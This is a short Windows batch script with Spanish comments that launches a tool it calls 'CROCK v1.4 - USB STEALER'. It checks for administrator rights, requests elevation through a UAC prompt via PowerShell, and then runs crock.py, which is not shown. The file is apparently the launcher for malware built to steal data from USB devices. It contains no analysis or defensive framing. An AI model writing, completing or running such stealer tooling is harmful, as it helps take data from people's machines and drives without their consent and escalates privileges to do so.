@echo off
REM CROCK v1.4 - USB STEALER - RUN WITH ADMIN PRIVILEGES
REM Este archivo ejecuta el proyecto con permisos de administrador

setlocal enabledelayedexpansion

REM Verificar si ya estamos en admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [*] Solicitando permisos de administrador...
    echo [*] Por favor confirma en la ventana de UAC...
    powershell -Command "Start-Process cmd -ArgumentList '/c cd /d %CD% && python crock.py' -Verb runas"
    exit /b
)

REM Si ya estamos en admin, ejecutar directamente
echo [+] Ejecutando CROCK v1.4 con permisos de administrador...
echo.

python crock.py

pause
